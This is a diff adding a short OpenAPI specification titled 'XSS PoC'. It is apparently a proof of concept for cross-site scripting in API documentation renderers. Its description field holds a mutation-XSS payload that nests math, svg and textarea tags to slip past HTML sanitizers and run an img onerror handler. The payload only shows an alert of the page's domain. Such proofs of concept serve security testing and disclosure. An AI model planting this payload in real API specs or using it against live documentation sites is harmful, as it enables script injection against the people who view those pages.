@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+info:
+  title: "XSS PoC"
+  version: "1.0.0"
+  description: |
+    <p><math><mtext></p><p><mglyph><svg><mtext><textarea></textarea><img src=x onerror=alert(document.domain)>
+paths: {}
